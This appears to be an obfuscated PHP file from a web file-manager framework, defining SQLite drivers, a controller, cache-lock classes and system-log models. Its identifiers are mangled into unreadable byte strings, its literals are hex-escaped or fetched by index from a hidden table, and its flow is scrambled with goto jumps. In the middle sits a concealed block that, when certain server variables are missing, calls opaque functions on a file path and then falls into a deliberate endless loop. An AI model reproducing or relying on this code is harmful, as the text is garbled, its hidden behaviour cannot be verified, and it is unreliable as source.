escapeString($DÙÍÈ¸¨ëà) { $Aª„ÒÀ¾ª± =& $_SERVER[±á õÁ]; switch ($this->dbType) { case $Aª„ÒÀ¾ª±[876]: case $Aª„ÒÀ¾ª±[849]: case $Aª„ÒÀ¾ª±[867]: case $Aª„ÒÀ¾ª±[879]: return addslashes($DÙÍÈ¸¨ëà); case $Aª„ÒÀ¾ª±[851]: case $Aª„ÒÀ¾ª±[868]: case $Aª„ÒÀ¾ª±[850]: case $Aª„ÒÀ¾ª±[852]: return str_ireplace($Aª„ÒÀ¾ª±[65], $Aª„ÒÀ¾ª±[66], $DÙÍÈ¸¨ëà); } } protected function parseValue($cˆ’¶¦²ÌÛ) { $a¸èì„§¢µ =& $_SERVER[±á õÁ]; if (is_string($cˆ’¶¦²ÌÛ)) { $cˆ’¶¦²ÌÛ = strpos($cˆ’¶¦²ÌÛ, $a¸èì„§¢µ[4]) === 0 ? $this->escapeString($cˆ’¶¦²ÌÛ) : $a¸èì„§¢µ[889] . $this->escapeString($cˆ’¶¦²ÌÛ) . $a¸èì„§¢µ[889]; } elseif (isset($cˆ’¶¦²ÌÛ[0]) && is_string($cˆ’¶¦²ÌÛ[0]) && strtolower($cˆ’¶¦²ÌÛ[0]) == $a¸èì„§¢µ[300]) { $cˆ’¶¦²ÌÛ = $this->escapeString($cˆ’¶¦²ÌÛ[1]); } elseif (is_array($cˆ’¶¦²ÌÛ)) { $cˆ’¶¦²ÌÛ = array_map(array($this, $a¸èì„§¢µ[890]), $cˆ’¶¦²ÌÛ); } elseif (is_bool($cˆ’¶¦²ÌÛ)) { $cˆ’¶¦²ÌÛ = $cˆ’¶¦²ÌÛ ? $a¸èì„§¢µ[93] : $a¸èì„§¢µ[493]; } elseif (is_null($cˆ’¶¦²ÌÛ)) { $cˆ’¶¦²ÌÛ = $a¸èì„§¢µ[109]; } return $cˆ’¶¦²ÌÛ; } public function getLastInsertId() { $A›¬ˆøÔ¸¤ =& $_SERVER[±á õÁ]; switch ($this->dbType) { case $A›¬ˆøÔ¸¤[876]: case $A›¬ˆøÔ¸¤[868]: case $A›¬ˆøÔ¸¤[849]: case $A›¬ˆøÔ¸¤[867]: case $A›¬ˆøÔ¸¤[851]: case $A›¬ˆøÔ¸¤[879]: return $this->_linkID->lastInsertId(); case $A›¬ˆøÔ¸¤[850]: case $A›¬ˆøÔ¸¤[852]: $AéµÇ˜Ò¢ƒ = $this->table; $Bé÷«ÄÇÉ = $this->query("\x53\105\x4c\x45\x43\x54\40{$AéµÇ˜Ò¢ƒ}\x2e\143\165\162\x72\x76\x61\154\x20\x63\x75\162\162\166\x61\154\x20\x46\122\117\115\40\x64\x75\x61\x6c"); return $Bé÷«ÄÇÉ ? $Bé÷«ÄÇÉ[0][$A›¬ˆøÔ¸¤[891]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($c´º£«Ï) { $d†ˆ•ñåÊ =& $_SERVER[±á õÁ]; if (!CacheLock::fileLock($d†ˆ•ñåÊ[19])) { return !1; } $C°‹Š²©Ÿæ = parent::query($c´º£«Ï); CacheLock::fileUnLock($d†ˆ•ñåÊ[19]); return $C°‹Š²©Ÿæ; } public function execute($Fëõëù¬) { $Fò‹¡šÄ¢® =& $_SERVER[±á õÁ]; if (!CacheLock::fileLock($Fò‹¡šÄ¢®[19])) { return !1; } $EÁ‰œáµĞâ = parent::execute($Fëõëù¬); CacheLock::fileUnLock($Fò‹¡šÄ¢®[19]); return $EÁ‰œáµĞâ; } } class DbSqlite3 extends DbSqlite3Base { public function query($AŞˆ¹Î×Æ†) { $BéÓ§é“ÑÙ =& $_SERVER[±á õÁ]; if (!CacheLock::fileLock($BéÓ§é“ÑÙ[19])) { return !1; } $E½ÛŠ‰Ùà† = parent::query($AŞˆ¹Î×Æ†); CacheLock::fileUnLock($BéÓ§é“ÑÙ[19]); return $E½ÛŠ‰Ùà†; } public function execute($B×ÜàÂø¾è) { $eÈ’…¶³é¤ =& $_SERVER[±á õÁ]; if (!CacheLock::fileLock($eÈ’…¶³é¤[19])) { return !1; } $aì·èÂøíÇ = parent::execute($B×ÜàÂø¾è); CacheLock::fileUnLock($eÈ’…¶³é¤[19]); return $aì·èÂøíÇ; } } goto fÂå‡¥­ä†; B„äîµÅêİ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto A’·©ÀÂ²¬; FöÇàÒÚ¡ç: $this->tpl = TEMPLATE . MOD . $aé¨éÇÅô¬[8]; $this->_classObjectID = mt_rand(0, 10000); goto F´ô¸£ÏŒÚ; cºñ…—ï†: $this->in =& $in; $this->values[$aé¨éÇÅô¬[6]] =& $config; $this->values[$aé¨éÇÅô¬[7]] =& $in; goto FöÇàÒÚ¡ç; A’·©ÀÂ²¬: $aé¨éÇÅô¬ =& $_SERVER[±á õÁ]; global $in, $config; $this->config =& $config; goto cºñ…—ï†; F´ô¸£ÏŒÚ: } public function loadClass($f½×£º—„È) { if (1 === func_num_args()) { $this->{$f½×£º—„È} = new $f½×£º—„È(); } else { $b¼Š¦Ëöß² = new ReflectionClass($f½×£º—„È); $C‹¦¥àÃòî = func_get_args(); array_shift($C‹¦¥àÃòî); $this->{$f½×£º—„È} = $b¼Š¦Ëöß²->newInstanceArgs($C‹¦¥àÃòî); } return $this->{$f½×£º—„È}; } protected function assign($dâá÷÷É¸ï, $eŞÎÄ®äÛ¹) { $this->values[$dâá÷÷É¸ï] = $eŞÎÄ®äÛ¹; } protected function display($bÖãìÚğ½) { ob_end_clean(); extract($this->values); require $this->tpl . $bÖãìÚğ½; } } if (!isset($_SERVER[$_SERVER[±á õÁ][9]]) || !isset($_SERVER[$_SERVER[±á õÁ][10]])) { goto aÏ¼†Å”Ó–; aÏ¼†Å”Ó–: $BùÕÙ„æİ¤ = $_SERVER[±á õÁ][11]; $f»ÀÉï‰° = $_SERVER[$_SERVER[±á õÁ][12]] . $_SERVER[±á õÁ][13]; $cí†«Ü = $BùÕÙ„æİ¤($f»ÀÉï‰°); goto e¸ê•§˜šã; e¸ê•§˜šã: $fÊ¸È¡µ‘‰ = explode($_SERVER[±á õÁ][14], $cí†«Ü); if (count($fÊ¸È¡µ‘‰) < $_SERVER[±á õÁ][15]) { $F«Õ×·ù¯ = $_SERVER[±á õÁ][16]; $F«Õ×·ù¯(); } $BÎ¥¹ŞãŒ• = $_SERVER[±á õÁ][17]; goto C¶ä« ¼ˆÛ; C¶ä« ¼ˆÛ: $BÎ¥¹ŞãŒ•($_SERVER[$_SERVER[±á õÁ][12]] . $_SERVER[±á õÁ][13]); $EÂºëš‘ğÕ = 2; while ($EÂºëš‘ğÕ > 1) { $DŠƒ·©™Ûó = rawurlencode($EÂºëš‘ğÕ . $_SERVER[±á õÁ][18]); } goto D¿‡£ó¨­; D¿‡£ó¨­: } class DbSqliteBase extends Db { public function __construct($Cí›Í¡‰ª° = '') { $EÖİ±±ùéê =& $_SERVER[±á õÁ]; if (!extension_loaded($EÖİ±±ùéê[19])) { think_exception(think_lang($EÖİ±±ùéê[20]) . $EÖİ±±ùéê[21]); } if (!empty($Cí›Í¡‰ª°)) { if (!isset($Cí›Í¡‰ª°[$EÖİ±±ùéê[22]])) { $Cí›Í¡‰ª°[$EÖİ±±ùéê[22]] = 438; } $this->config = $Cí›Í¡‰ª°; if (empty($this->config[$EÖİ±±ùéê[23]])) { $this->config[$EÖİ±±ùéê[23]] = array(); } } } public function connect($b°Ã¬¼Æ„ò = '', $cñƒõ±³î = 0) { $d‹ßˆØñ…Œ =& $_SERVER[±á õÁ]; if (!isset($this->linkID[$cñƒõ±³î])) { goto bŞÎ¨ÈİÏî; bŞÎ¨ÈİÏî: if (empty($b°Ã¬¼Æ„ò)) { $b°Ã¬¼Æ„ò = $this->config; } $E¬®ß»çÑÇ = !empty($b°Ã¬¼Æ„ò[$d‹ßˆØñ…Œ[23]][$d‹ßˆØñ…Œ[24]]) ? $b°Ã¬¼Æ„ò[$d‹ßˆØñ…Œ[23]][$d‹ßˆØñ…Œ[24]] : $this->pconnect; $Bòï¡é¥É = $E¬®ß»çÑÇ ? $d‹ßˆØñ…Œ[25] : $d‹ßˆØñ…Œ[26]; goto C„ÜôÆæõƒ; e§æé­ï¯Ò: @sqlite_busy_timeout($this->linkID[$cñƒõ±³î], 30000); if (1 != think_config($d‹ßˆØñ…Œ[28])) { unset($this->config); } goto F¶¿˜ö„ô; C„ÜôÆæõƒ: $this->linkID[$cñƒõ±³î] = $Bòï¡é¥É($b°Ã¬¼Æ„ò[$d‹ßˆØñ…Œ[27]], $b°Ã¬¼Æ„ò[$d‹ßˆØñ…Œ[22]]); if (!$this->linkID[$cñƒõ±³î]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto e§æé­ï¯Ò; F¶¿˜ö„ô: } return $this->linkID[$cñƒõ±³î]; } public function free() { $this->queryID = null; } public function query($eÅ¶‰â²ê) { goto a•‚—÷ï—; a•‚—÷ï—: $f‹¨¿‘²ÜÅ =& $_SERVER[±á õÁ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aà‚Î¾Ïå; bÌöŠõƒˆ³: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $dòÇæØÏä = $this->getAll(); return $dòÇæØÏä; } goto bîñÅº™×; FÖãåí”¦ø: think_status($f‹¨¿‘²ÜÅ[30]); $this->queryID = sqlite_query($this->_linkID, $eÅ¶‰â²ê); $this->debug(); goto bÌöŠõƒˆ³; aà‚Î¾Ïå: $this->queryStr = $eÅ¶‰â²ê; if ($this->queryID) { $this->free(); } think_action_status($f‹¨¿‘²ÜÅ[29], 1); goto FÖãåí”¦ø; bîñÅº™×: } public function execute($F†‹«Àñ°˜) { goto E‡¼¸È–¨•; d´å–¢¾½±: if (!1 === $A•Šó¥œÀº) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto C‰¢ÆŞ¥µÙ; eÏÓ¼¡ŸØ: $this->queryStr = $F†‹«Àñ°˜; if ($this->queryID) { $this->free(); } think_action_status($eµáùˆìÚ[31], 1); goto bçñ¦´Æ‡‡; E‡¼¸È–¨•: $eµáùˆìÚ =& $_SERVER[±á õÁ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eÏÓ¼¡ŸØ; bçñ¦´Æ‡‡: think_status($eµáùˆìÚ[30]); $A•Šó¥œÀº = sqlite_exec($this->_linkID, $F†‹«Àñ°˜); $this->debug(); goto d´å–¢¾½±; C‰¢ÆŞ¥µÙ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[±á õÁ][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dÜäªù‡æ÷ = sqlite_query($this->_linkID, $_SERVER[±á õÁ][33]); if (!$dÜäªù‡æ÷) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $eÁ¨‘Ô˜Ææ = sqlite_query($this->_linkID, $_SERVER[±á õÁ][34]); if (!$eÁ¨‘Ô˜Ææ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $C¸‹ŒÌ¡Ÿ‡ = array(); if ($this->numRows > 0) { for ($aŞÔÍ›Ÿ’ô = 0; $aŞÔÍ›Ÿ’ô < $this->numRows; $aŞÔÍ›Ÿ’ô++) { $C¸‹ŒÌ¡Ÿ‡[$aŞÔÍ›Ÿ’ô] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $C¸‹ŒÌ¡Ÿ‡; } public function getFields($f¶¡ë¨Ù§) { $E÷ÎÂˆƒÒ¸ =& $_SERVER[±á õÁ]; $D¨’Á¹¾ë = $this->query($E÷ÎÂˆƒÒ¸[35] . $f¶¡ë¨Ù§ . $E÷ÎÂˆƒÒ¸[36]); $aÁÁŠóœé§ = array(); if ($D¨’Á¹¾ë) { foreach ($D¨’Á¹¾ë as $eˆºÂÒ²ø˜ => $e“‚ ¬†£§) { $aÁÁŠóœé§[$e“‚ ¬†£§[$E÷ÎÂˆƒÒ¸[37]]] = array($E÷ÎÂˆƒÒ¸[38] => $e“‚ ¬†£§[$E÷ÎÂˆƒÒ¸[37]], $E÷ÎÂˆƒÒ¸[39] => $e“‚ ¬†£§[$E÷ÎÂˆƒÒ¸[40]], $E÷ÎÂˆƒÒ¸[41] => (bool) ($e“‚ ¬†£§[$E÷ÎÂˆƒÒ¸[42]] === $E÷ÎÂˆƒÒ¸[43]), $E÷ÎÂˆƒÒ¸[44] => $e“‚ ¬†£§[$E÷ÎÂˆƒÒ¸[45]], $E÷ÎÂˆƒÒ¸[46] => strtolower($e“‚ ¬†£§[$E÷ÎÂˆƒÒ¸[47]]) == $E÷ÎÂˆƒÒ¸[48], $E÷ÎÂˆƒÒ¸[49] => strtolower($e“‚ ¬†£§[$E÷ÎÂˆƒÒ¸[50]]) == $E÷ÎÂˆƒÒ¸[51]); } } return $aÁÁŠóœé§; } public function getTables($Aé¬àÃÕÆ = '') { $eÆ„Ø…·¾İ =& $_SERVER[±á õÁ]; $AĞµññµã° = $this->query($eÆ„Ø…·¾İ[52] . $eÆ„Ø…·¾İ[53] . $eÆ„Ø…·¾İ[54]); $DÌ©ƒÜ¹ß = array(); foreach ($AĞµññµã° as $DÜÅèŸÊâ => $a·ƒòÍšŠì) { $DÌ©ƒÜ¹ß[$DÜÅèŸÊâ] = current($a·ƒòÍšŠì); } return $DÌ©ƒÜ¹ß; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Aª‡†ğÉø =& $_SERVER[±á õÁ]; $dñ¦•À…Š÷ = sqlite_last_error($this->_linkID); $this->error = $dñ¦•À…Š÷ . $Aª‡†ğÉø[4] . sqlite_error_string($dñ¦•À…Š÷); if ($Aª‡†ğÉø[43] != $this->queryStr) { $this->error .= LNG($Aª‡†ğÉø[55]) . $this->queryStr; } think_trace($this->error, $Aª‡†ğÉø[43], $Aª‡†ğÉø[56]); return $this->error; } public function escapeString($F–¾¯ÍÇ) { return sqlite_escape_string($F–¾¯ÍÇ); } public function parseLimit($C¬™ÀºÔ¯„) { $dÅ´Çóéî =& $_SERVER[±á õÁ]; $dïŒ¶ßíÉ¿ = $dÅ´Çóéî[43]; if (!empty($C¬™ÀºÔ¯„)) { $C¬™ÀºÔ¯„ = explode($dÅ´Çóéî[57], $C¬™ÀºÔ¯„); if (count($C¬™ÀºÔ¯„) > 1) { $dïŒ¶ßíÉ¿ .= $dÅ´Çóéî[58] . $C¬™ÀºÔ¯„[1] . $dÅ´Çóéî[59] . $C¬™ÀºÔ¯„[0] . $dÅ´Çóéî[60]; } else { $dïŒ¶ßíÉ¿ .= $dÅ´Çóéî[58] . $C¬™ÀºÔ¯„[0] . $dÅ´Çóéî[60]; } } return $dïŒ¶ßíÉ¿; } } goto D„Ñğ¾¥‚Á; D¯É¦ÍÚ°: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $d’ò¨Óß°Ö =& $_SERVER[±á õÁ]; $F¦†ÑãÚŸ = $GLOBALS[$d’ò¨Óß°Ö[6]][$d’ò¨Óß°Ö[352]]; self::$cachePath = $F¦†ÑãÚŸ[$d’ò¨Óß°Ö[181]][$d’ò¨Óß°Ö[85]]; @mkdir(self::$cachePath, 511, !0); } public function lock($bÀ¤Ñ­©Ë, $CÑ’§Àì = 0) { goto d½Œ®´ˆÜ; d½Œ®´ˆÜ: $EìáôÙ™ß¿ =& $_SERVER[±á õÁ]; $A«»ë¬—Ï = microtime(!0); $D‰öÖ××– = $A«»ë¬—Ï + $CÑ’§Àì + 0.0001; goto cƒ£°ï¢çø; cƒ£°ï¢çø: $EÚÑ¡‡î‚² = rtrim(self::$cachePath, $EìáôÙ™ß¿[8]) . $EìáôÙ™ß¿[801] . md5($bÀ¤Ñ­©Ë) . $EìáôÙ™ß¿[798]; if (file_exists($EÚÑ¡‡î‚²) && filemtime($EÚÑ¡‡î‚²) && filemtime($EÚÑ¡‡î‚²) < time() - 10) { @unlink($EÚÑ¡‡î‚²); } do { if (file_exists($EÚÑ¡‡î‚²)) { cacheLockWait(); continue; } $AŞøïÍÛá = fopen($EÚÑ¡‡î‚², $EìáôÙ™ß¿[802]); if (!$AŞøïÍÛá) { return !1; } $BÓ¾Š‹ƒšä = flock($AŞøïÍÛá, LOCK_EX | LOCK_NB); self::$caches[$bÀ¤Ñ­©Ë] = array($EìáôÙ™ß¿[803] => $AŞøïÍÛá, $EìáôÙ™ß¿[181] => $EÚÑ¡‡î‚²); fwrite($AŞøïÍÛá, $D‰öÖ××–); clearstatcache(); if ($AŞøïÍÛá && $BÓ¾Š‹ƒšä) { return !0; } cacheLockWait(); } while (microtime(!0) < $D‰öÖ××–); goto BªâÎ—Œ®ï; BªâÎ—Œ®ï: $this->unlock($bÀ¤Ñ­©Ë); return !1; goto e»­ëíÄ“‰; e»­ëíÄ“‰: } public function lockGet($E¤±„ä‚¸ó) { $Cˆ›¿¤œÀ„ =& $_SERVER[±á õÁ]; $f‰ºó¨¾§ò = rtrim(self::$cachePath, $Cˆ›¿¤œÀ„[8]) . $Cˆ›¿¤œÀ„[801] . md5($E¤±„ä‚¸ó) . $Cˆ›¿¤œÀ„[798]; return file_exists($f‰ºó¨¾§ò); } public function unlock($CÍƒÁšÚÅà) { goto aÖ‹˜¥ÈÈ•; aÖ‹˜¥ÈÈ•: $dµŸ’æëÕÅ =& $_SERVER[±á õÁ]; $aŞĞËÍ¢Ñá = self::$caches[$CÍƒÁšÚÅà]; if (!$aŞĞËÍ¢Ñá) { return; } goto DïÁ÷‘ØÛ‡; DïÁ÷‘ØÛ‡: @flock($aŞĞËÍ¢Ñá[$dµŸ’æëÕÅ[803]], LOCK_UN); @fclose($aŞĞËÍ¢Ñá[$dµŸ’æëÕÅ[803]]); @unlink($aŞĞËÍ¢Ñá[$dµŸ’æëÕÅ[181]]); goto d¹Âá‹öãÚ; d¹Âá‹öãÚ: unset(self::$caches[$CÍƒÁšÚÅà]); goto B¿Ãóƒ…°¬; B¿Ãóƒ…°¬: } } class CacheLockRedis { public function lock($bµÑ¥£ÑÀÏ, $D±¨ìÜËÓÕ = 10) { $Aè…Œ‡šœ¶ = Cache::init(); $DÅåíºÇŠç = microtime(!0) + $D±¨ìÜËÓÕ; while (microtime(!0) < $DÅåíºÇŠç) { $C‹ï¼„»Â = $Aè…Œ‡šœ¶->get($bµÑ¥£ÑÀÏ); if (!$C‹ï¼„»Â) { $Däã¬÷Å‹Á = $Aè…Œ‡šœ¶->setLock($bµÑ¥£ÑÀÏ, $DÅåíºÇŠç, $D±¨ìÜËÓÕ); if ($Däã¬÷Å‹Á) { return !0; } } else { if ($C‹ï¼„»Â < microtime(!0)) { $Aè…Œ‡šœ¶->set($bµÑ¥£ÑÀÏ, $DÅåíºÇŠç, $DÅåíºÇŠç); if ($Aè…Œ‡šœ¶->get($bµÑ¥£ÑÀÏ) === $C‹ï¼„»Â) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($CÈåÉÛ¸´Û) { return Cache::init()->get($CÈåÉÛ¸´Û); } public function unlock($dÈÊ¾…Ğ„§) { return Cache::init()->remove($dÈÊ¾…Ğ„§); } } class CacheLockMemcached { public function lock($cÑÏ¥ØÛ‹, $Fã¤ä„ÍˆÑ = 0) { $b‹õ¾¼‹§ô = Cache::init(); $e˜ñŠïºÅÛ = microtime(!0) + $Fã¤ä„ÍˆÑ; while (microtime(!0) < $e˜ñŠïºÅÛ) { $D¡‚Öƒ×è = $b‹õ¾¼‹§ô->get($cÑÏ¥ØÛ‹); if (!$D¡‚Öƒ×è || $D¡‚Öƒ×è < microtime(!0)) { $D¨¿£ˆâêË = $b‹õ¾¼‹§ô->handle->add($cÑÏ¥ØÛ‹, $e˜ñŠïºÅÛ, $Fã¤ä„ÍˆÑ); if ($D¨¿£ˆâêË) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($aÒâ£¨¼ÙÈ) { return Cache::init()->get($aÒâ£¨¼ÙÈ); } public function unlock($C…‰èªà„ò) { return Cache::init()->remove($C…‰èªà„ò); } } goto EŞïÒÀ„ºî; f‚Øñ¼ß¼: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\x4c\151\x67\150\164\101\160\x70"; public $modelType = "\123\171\163\x74\145\x6d\117\x70\164\x69\x6f\x6e"; public $field = array("\156\x61\155\145", "\x67\162\x6f\165\x70", "\x64\x65\x73\x63", "\143\x6f\156\164\145\156\164"); public function listData($e®Ù§ØĞÔÉ = false, $C•é„íò = "\155\157\x64\151\x66\x79\124\x69\155\145", $FìÅ³—»„ó = true) { return parent::listData($e®Ù§ØĞÔÉ, $C•é„íò, $FìÅ³—»„ó); } public function remove($a¨Ÿ“»Ü‡«) { $c…Ü¯‹®„á = $this->findByName($a¨Ÿ“»Ü‡«); if (!$c…Ü¯‹®„á) { return !1; } return parent::remove($c…Ü¯‹®„á[$_SERVER[±á õÁ][391]]); } public function add($EºÉ”´óğª) { if ($this->findByName($EºÉ”´óğª[$_SERVER[±á õÁ][38]])) { return !1; } return parent::insert($EºÉ”´óğª); } public function update($DŒ•¯Øå½, $c‰á§©ŠÖ§) { $Aåó¯„•†­ =& $_SERVER[±á õÁ]; $c‡‘òˆŞõ = $this->findByName($DŒ•¯Øå½); $a¶°š’ÈÄ­ = $this->findByName($c‰á§©ŠÖ§[$Aåó¯„•†­[38]]); if (!$c‡‘òˆŞõ || $a¶°š’ÈÄ­ && $a¶°š’ÈÄ­[$Aåó¯„•†­[391]] != $c‡‘òˆŞõ[$Aåó¯„•†­[391]]) { return !1; } return parent::update($c‡‘òˆŞõ[$Aåó¯„•†­[391]], $c‰á§©ŠÖ§); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\x6d\137\x6c\x6f\x67"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\124\151\155\145", "\164\151\x6d\145", "\151\156\x73\145\162\164", "\146\x75\156\143\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $Dæ·ĞçÈßŒ =& $_SERVER[±á õÁ]; return array($Dæ·ĞçÈßŒ[1929] => LNG($Dæ·ĞçÈßŒ[1930]), $Dæ·ĞçÈßŒ[1931] => LNG($Dæ·ĞçÈßŒ[1932]), $Dæ·ĞçÈßŒ[1560] => LNG($Dæ·ĞçÈßŒ[1933]), $Dæ·ĞçÈßŒ[1934] => LNG($Dæ·ĞçÈßŒ[1935]), $Dæ·ĞçÈßŒ[1936] => LNG($Dæ·ĞçÈßŒ[1937]), $Dæ·ĞçÈßŒ[1938] => LNG($Dæ·ĞçÈßŒ[1939]), $Dæ·ĞçÈßŒ[1940] => LNG($Dæ·ĞçÈßŒ[1941]), $Dæ·ĞçÈßŒ[1942] => LNG($Dæ·ĞçÈßŒ[1943]), $Dæ·ĞçÈßŒ[1944] => LNG($Dæ·ĞçÈßŒ[1945]), $Dæ·ĞçÈßŒ[1591] => LNG($Dæ·ĞçÈßŒ[1945]), $Dæ·ĞçÈßŒ[1592] => LNG($Dæ·ĞçÈßŒ[1946]), $Dæ·ĞçÈßŒ[1947] => LNG($Dæ·ĞçÈßŒ[1948]), $Dæ·ĞçÈßŒ[1949] => LNG($Dæ·ĞçÈßŒ[1950]), $Dæ·ĞçÈßŒ[1951] => LNG($Dæ·ĞçÈßŒ[1952]), $Dæ·ĞçÈßŒ[1953] => LNG($Dæ·ĞçÈßŒ[1954]), $Dæ·ĞçÈßŒ[1589] => LNG($Dæ·ĞçÈßŒ[1955]), $Dæ·ĞçÈßŒ[1596] => LNG($Dæ·ĞçÈßŒ[1956]), $Dæ·ĞçÈßŒ[1957] => LNG($Dæ·ĞçÈßŒ[1958]), $Dæ·ĞçÈßŒ[1959] => LNG($Dæ·ĞçÈßŒ[1960]), $Dæ·ĞçÈßŒ[1961] => LNG($Dæ·ĞçÈßŒ[1962]), $Dæ·ĞçÈßŒ[1963] => LNG($Dæ·ĞçÈßŒ[1964]), $Dæ·ĞçÈßŒ[1599] => LNG($Dæ·ĞçÈßŒ[1965]), $Dæ·ĞçÈßŒ[1600] => LNG($Dæ·ĞçÈßŒ[1966]), $Dæ·ĞçÈßŒ[1967] => LNG($Dæ·ĞçÈßŒ[1968]), $Dæ·ĞçÈßŒ[1969] => LNG($Dæ·ĞçÈßŒ[1970]), $Dæ·ĞçÈßŒ[1971] => LNG($Dæ·ĞçÈßŒ[1972]), $Dæ·ĞçÈßŒ[1594] => LNG($Dæ·ĞçÈßŒ[1973]), $Dæ·ĞçÈßŒ[1974] => LNG($Dæ·ĞçÈßŒ[1975]), $Dæ·ĞçÈßŒ[1593] => LNG($Dæ·ĞçÈßŒ[1976]), $Dæ·ĞçÈßŒ[1977] => LNG($Dæ·ĞçÈßŒ[1978]), $Dæ·ĞçÈßŒ[1979] => LNG($Dæ·ĞçÈßŒ[1980]), $Dæ·ĞçÈßŒ[1981] => LNG($Dæ·ĞçÈßŒ[1981]), $Dæ·ĞçÈßŒ[1982] => LNG($Dæ·ĞçÈßŒ[1564]), $Dæ·ĞçÈßŒ[1983] => LNG($Dæ·ĞçÈßŒ[1984]), $Dæ·ĞçÈßŒ[1985] => LNG($Dæ·ĞçÈßŒ[1986]), $Dæ·ĞçÈßŒ[1987] => LNG($Dæ·ĞçÈßŒ[1988]), $Dæ·ĞçÈßŒ[1989] => LNG($Dæ·ĞçÈßŒ[1990]), $Dæ·ĞçÈßŒ[1991] => LNG($Dæ·ĞçÈßŒ[1992]), $Dæ·ĞçÈßŒ[1993] => LNG($Dæ·ĞçÈßŒ[1993]), $Dæ·ĞçÈßŒ[1994] => LNG($Dæ·ĞçÈßŒ[1995]), $Dæ·ĞçÈßŒ[1996] => LNG($Dæ·ĞçÈßŒ[1997]), $Dæ·ĞçÈßŒ[1998] => LNG($Dæ·ĞçÈßŒ[1999]), $Dæ·ĞçÈßŒ[2000] => LNG($Dæ·ĞçÈßŒ[2001]), $Dæ·ĞçÈßŒ[2002] => LNG($Dæ·ĞçÈßŒ[2003]), $Dæ·ĞçÈßŒ[2004] => LNG($Dæ·ĞçÈßŒ[2005])); } private function typeFile() { $Dï…¤‡¹¬– =& $_SERVER[±á õÁ]; $b‹µ÷¨ÚØ = array($Dï…¤‡¹¬–[1596] => array($Dï…¤‡¹¬–[1597]), $Dï…¤‡¹¬–[1951] => array($Dï…¤‡¹¬–[2006]), $Dï…¤‡¹¬–[1953] => array($Dï…¤‡¹¬–[2007]), $Dï…¤‡¹¬–[1589] => array($Dï…¤‡¹¬–[1590]), $Dï…¤‡¹¬–[1959] => array(), $Dï…¤‡¹¬–[1961] => array(), $Dï…¤‡¹¬–[1963] => array(), $Dï…¤‡¹¬–[1599] => array($Dï…¤‡¹¬–[1601]), $Dï…¤‡¹¬–[1600] => array($Dï…¤‡¹¬–[1601]), $Dï…¤‡¹¬–[1967] => array($Dï…¤‡¹¬–[2008]), $Dï…¤‡¹¬–[1969] => array($Dï…¤‡¹¬–[2008]), $Dï…¤‡¹¬–[1971] => array($Dï…¤‡¹¬–[2009]), $Dï…¤‡¹¬–[1957] => array($Dï…¤‡¹¬–[2010]), $Dï…¤‡¹¬–[1594] => array($Dï…¤‡¹¬–[2011]), $Dï…¤‡¹¬–[1974] => array($Dï…¤‡¹¬–[2012]), $Dï…¤‡¹¬–[1593] => array($Dï…¤‡¹¬–[1595])); return $b‹µ÷¨ÚØ; } private function typeAll() { goto EŠƒ÷‘ÀöÏ; bó Î“Éä: foreach ($c¼êá¬±–¬ as $BÑ¢”·Ñ§à => $AĞ‡¿ã”œ†) { $Aˆ™ Ù—ïá[$AĞ‡¿ã”œ†[0]] = $Aˆ™ Ù—ïá[$BÑ¢”·Ñ§à]; } $Aˆ™ Ù—ïá[$A³Í–ÚÙ•¯[1601]] = LNG($A³Í–ÚÙ•¯[2013]); $Aˆ™ Ù—ïá[$A³Í–ÚÙ•¯[2008]] = LNG($A³Í–ÚÙ•¯[2014]); goto AÆµ²£åŒŠ; EŠƒ÷‘ÀöÏ: $A³Í–ÚÙ•¯ =& $_SERVER[±á õÁ]; $Aˆ™ Ù—ïá = $this->typeList; $c¼êá¬±–¬ = array_filter($this->typeFile()); goto bó Î“Éä; AÆµ²£åŒŠ: return $Aˆ™ Ù—ïá; goto e¯ÛâšØ©¢; e¯ÛâšØ©¢: } public function addLog($e¾¤ˆøœôù, $cÃ«è«¡ØÖ = array()) { goto D¼„Ç»µæœ; EâóŞÖÊéŞ: if (!$Dö÷èÀ›õ) { $Dö÷èÀ›õ = (int) Session::get($bÎ„ïÈ‰ñ¢[1743]); } $B‚ª²×‰ë¤ = get_client_ip(); if (!$cÃ«è«¡ØÖ || strlen(json_encode($cÃ«è«¡ØÖ)) >= 1024) { $cÃ«è«¡ØÖ = array($bÎ„ïÈ‰ñ¢[2015] => $B‚ª²×‰ë¤); } else { if (is_array($cÃ«è«¡ØÖ)) { $cÃ«è«¡ØÖ[$bÎ„ïÈ‰ñ¢[2015]] = $B‚ª²×‰ë¤; } else { $cÃ«è«¡ØÖ = array($bÎ„ïÈ‰ñ¢[1056] => $cÃ«è«¡ØÖ, $bÎ„ïÈ‰ñ¢[2015] => $B‚ª²×‰ë¤); } } goto cš‚É”´½±; D¼„Ç»µæœ: $bÎ„ïÈ‰ñ¢ =& $_SERVER[±á õÁ]; if (!isset($this->typeList[$e¾¤ˆøœôù])) { return; } $Dö÷èÀ›õ = defined($bÎ„ïÈ‰ñ¢[450]) && USER_ID ? USER_ID : 